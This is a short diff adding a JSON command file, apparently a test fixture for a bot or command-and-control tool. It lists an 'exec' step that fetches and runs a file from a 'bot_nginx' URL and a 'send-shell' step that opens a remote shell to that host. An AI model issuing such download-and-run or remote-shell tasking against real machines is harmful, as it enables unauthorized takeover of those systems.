@@ -1,0 +1,14 @@
+{"commands":
+    [    {    
+            "id":"0",
+            "command":"exec",
+            "url":"http://bot_nginx/files/testfile"
+         },
+         {
+             "id":"1",
+             "command":"send-shell",
+             "target":"bot_nginx",
+             "port":"random"
+         }
+    ]
+}
